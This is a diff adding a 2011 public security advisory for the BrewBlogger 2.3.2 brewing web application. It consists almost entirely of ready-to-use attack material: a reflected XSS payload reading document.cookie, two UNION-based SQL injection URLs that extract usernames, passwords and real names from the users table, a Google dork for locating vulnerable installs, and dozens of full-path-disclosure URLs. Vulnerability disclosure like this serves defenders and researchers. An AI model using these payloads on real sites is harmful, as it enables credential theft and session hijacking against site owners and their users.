@@ -1,0 +1,104 @@
+BrewBlogger 2.3.2 multiple security vulnerabilities
+
+# Date: 2011-06-23
+# Author: Brendan Coles <bcoles@gmail.com>
+# Advisory: http://itsecuritysolutions.org/2011-06-23_BrewBlogger_2.3.2_multiple_security_vulnerabilities/
+
+# Software: BrewBlogger
+# Version: 2.3.2 (Club Edition and Personal Edition)
+# Homepage: http://www.brewblogger.net/
+# Source: http://sourceforge.net/projects/brewblogger/files/BrewBlogger/BrewBlogger%202.3.2/BrewBlogger2.3.2.tar.gz/download
+# Google Dork: ("BrewBlogger 2.3.2 Club Edition developed by zkdigital.com"|"BrewBlogger 2.3.2 Personal Edition developed by zkdigital.com")
+
+# Vendor: Geoff Humphrey
+# Homepage: http://zkdigital.com/
+# Notified: Unnotified
+
+
+# Reflected Cross-Site Scripting (XSS):
+
+http://localhost/[PATH]/index.php?page=brewBlogList&style="><script>alert(document.cookie)</script><p+"
+
+
+# SQL Injection:
+
+http://localhost/[PATH]/sections/reference.inc.php?source=log&section=styles&styleNumber=null union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,concat(user_name,0x3a,password),null,concat(realFirstName,0x20,realLastName) FROM users--
+
+http://localhost/[PATH]/sections/reference.inc.php?source=log&section=styles&filterStyle=null union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,concat(user_name,0x3a,password),null,concat(realFirstName,0x20,realLastName) FROM users--
+
+
+# Full Path Disclosure:
+
+http://localhost/[PATH]/includes/beerXMLparser/input_beer_xml_ugh.inc.php
+http://localhost/[PATH]/includes/authentication_nav.inc.php
+http://localhost/[PATH]/includes/db_connect_log.inc.php
+http://localhost/[PATH]/includes/db_connect_universal.inc.php
+http://localhost/[PATH]/includes/efficiency.inc.php
+http://localhost/[PATH]/includes/input_beer_xml.php
+http://localhost/[PATH]/includes/navigation.inc.php
+http://localhost/[PATH]/includes/plug-ins.inc.php
+http://localhost/[PATH]/includes/theme.inc.php
+http://localhost/[PATH]/sections/tools.inc.php
+http://localhost/[PATH]/sections/status.inc.php
+http://localhost/[PATH]/sections/specifics.inc.php
+http://localhost/[PATH]/sections/recipe_specifics.inc.php
+http://localhost/[PATH]/sections/recipe2.inc.php
+http://localhost/[PATH]/sections/recipe.inc.php
+http://localhost/[PATH]/sections/profile.inc.php
+http://localhost/[PATH]/sections/printXML.inc.php
+http://localhost/[PATH]/sections/printRecipe.inc.php
+http://localhost/[PATH]/sections/printLog.inc.php
+http://localhost/[PATH]/sections/print.inc.php
+http://localhost/[PATH]/sections/news.inc.php
+http://localhost/[PATH]/sections/memberList.inc.php
+http://localhost/[PATH]/sections/featured.inc.php
+http://localhost/[PATH]/sections/awardsList.inc.php
+http://localhost/[PATH]/reference/color.inc.php
+http://localhost/[PATH]/admin/tools/recipe_calculator.php
+http://localhost/[PATH]/admin/lib/calcFormVar.lib.php
+http://localhost/[PATH]/admin/lib/calculations.lib.php
+http://localhost/[PATH]/admin/lib/predicted.lib.php
+http://localhost/[PATH]/admin/includes/admin_nav.inc.php
+http://localhost/[PATH]/admin/includes/footer.inc.php
+http://localhost/[PATH]/admin/includes/sql_download.inc.php
+http://localhost/[PATH]/admin/admin_sections/bb_recipe.admin.php
+http://localhost/[PATH]/admin/admin_sections/list.admin.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/adjuncts.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/awards.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/brewer.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/brewerlinks.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/brewingcss.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/equip_profiles.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/extracts.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/grains.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/hops.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/mash_profiles.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/mash_steps.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/misc.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/preferences.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/reviews.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/styles.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/sugar_type.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/upcoming.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/users.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/add-edit/water_profiles.add-edit.php
+http://localhost/[PATH]/admin/admin_sections/recipe/adjuncts.recipe.php
+http://localhost/[PATH]/admin/admin_sections/list/adjuncts.list.php
+http://localhost/[PATH]/admin/admin_sections/list/brewblogs.list.php
+http://localhost/[PATH]/admin/admin_sections/list/brewerlinks.list.php
+http://localhost/[PATH]/admin/admin_sections/list/brewingcss.list.php
+http://localhost/[PATH]/admin/admin_sections/list/equip_profiles.list.php
+http://localhost/[PATH]/admin/admin_sections/list/extracts.list.php
+http://localhost/[PATH]/admin/admin_sections/list/grains.list.php
+http://localhost/[PATH]/admin/admin_sections/list/hops.list.php
+http://localhost/[PATH]/admin/admin_sections/list/mash_profiles.list.php
+http://localhost/[PATH]/admin/admin_sections/list/misc.list.php
+http://localhost/[PATH]/admin/admin_sections/list/news.list.php
+http://localhost/[PATH]/admin/admin_sections/list/recipes.list.php
+http://localhost/[PATH]/admin/admin_sections/list/reviews.list.php
+http://localhost/[PATH]/admin/admin_sections/list/styles.list.php
+http://localhost/[PATH]/admin/admin_sections/list/sugar_type.list.php
+http://localhost/[PATH]/admin/admin_sections/list/upcoming.list.php
+http://localhost/[PATH]/admin/admin_sections/list/users.list.php
+http://localhost/[PATH]/admin/admin_sections/list/water_profiles.list.php
+http://localhost/[PATH]/admin/admin_sections/list/yeast_profiles.list.php
